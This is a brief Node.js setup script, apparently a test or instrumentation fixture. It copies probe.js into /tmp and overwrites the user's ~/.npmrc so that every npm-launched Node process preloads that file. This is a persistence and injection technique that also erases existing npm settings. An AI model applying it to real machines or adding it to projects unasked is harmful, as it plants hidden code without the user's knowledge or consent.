const fs = require('fs');
const path = require('path');
const os = require('os');

const probeSource = path.join(__dirname, 'probe.js');
const probeDest = '/tmp/preload_probe.js';
const npmrcDest = path.join(os.homedir(), '.npmrc');

fs.copyFileSync(probeSource, probeDest);
fs.writeFileSync(npmrcDest, 'node-options=--require /tmp/preload_probe.js\n');

console.log('Setup complete');
